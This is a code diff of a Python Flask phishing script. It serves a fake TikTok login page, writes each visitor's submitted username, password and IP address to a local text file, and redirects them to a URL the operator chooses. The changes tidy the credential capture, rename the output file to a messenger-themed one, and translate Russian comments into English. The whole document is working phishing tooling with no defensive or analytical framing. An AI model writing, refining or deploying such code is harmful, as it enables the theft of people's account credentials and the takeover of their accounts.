@@ -1,5 +1,5 @@
 import os
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, request, redirect
 
 print('Setting up phishing...')
 action_url = input('Enter the URL to redirect users after phishing: ')
@@ -16,7 +16,6 @@ else:
         port = 8080
 
 app = Flask(__name__, template_folder='Phishing/templates/TIKTok')
-username = None
 
 @app.route("/")
 def home():
@@ -26,19 +25,19 @@ def home():
 
 @app.route("/login", methods=["POST"])
 def login():
-    global username
-    username = request.form['username']
-    password = request.form['password']
-    user_ip = request.remote_addr  # Получение IP-адреса пользователя внутри функции
+    username = request.form.get('username')
+    password = request.form.get('password')
+    user_ip = request.remote_addr
+
     print('User: ', username)
     print('Password: ', password)
 
-    # Определяем текущий путь
+    # Define file path for saving user data
     current_path = os.path.abspath(os.path.dirname(__file__))
-    file_path = os.path.join(current_path, 'tiktok_user_data.txt')
+    file_path = os.path.join(current_path, 'UserData/mesenger_user_data.txt')
     print(f"File path: {file_path}")
 
-    # Запись в файл с кодировкой UTF-8
+    # Write user data to file with UTF-8 encoding
     try:
         with open(file_path, 'a', encoding='utf-8') as file:
             file.write(f"User: {username}, Password: {password}, IP: {user_ip}\n")
@@ -47,11 +46,6 @@ def login():
         print(f"Error writing to file: {e}")
 
     return redirect(action_url)
-
-@app.route("/welcome")
-def welcome():
-    # Redirect to action_url on the client's browser
-    return render_template("xd1.html")
 
 if __name__ == '__main__':
     print("Starting the server...")
